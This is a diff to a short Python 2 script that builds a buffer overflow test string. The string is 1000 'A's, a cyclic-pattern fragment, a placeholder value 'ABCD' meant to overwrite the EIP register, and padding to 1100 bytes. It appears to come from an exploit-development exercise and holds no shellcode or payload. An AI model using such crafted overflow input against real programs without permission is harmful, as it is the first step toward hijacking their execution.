@@ -1,9 +1,8 @@
 #!/usr/bin/python 
 
 prefix = 'A' * 1000
-
-pattern = ''
-for i in range(0, 5):
-   for j in range(0, 10):
-      pattern += str(i) + str(j)
-print prefix + pattern
+padding1 = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1'
+eip = '\x41\x42\x43\x44'
+padding2 = 'X' * (1100 - 1000 - len(padding1) -4)
+      
+print prefix + padding1 + eip + padding2
